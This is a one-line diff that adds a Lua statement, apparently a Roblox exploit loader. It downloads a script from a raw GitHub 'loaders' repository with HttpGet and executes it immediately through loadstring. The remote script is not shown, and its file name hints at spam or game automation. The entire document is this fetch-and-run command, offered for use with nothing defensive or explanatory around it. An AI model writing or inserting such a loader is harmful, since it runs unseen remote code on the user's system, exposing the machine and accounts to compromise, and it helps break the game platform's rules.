@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/sell-fries-anomaly-spam3-7yh4xe1hgw6wdj.lua"))()
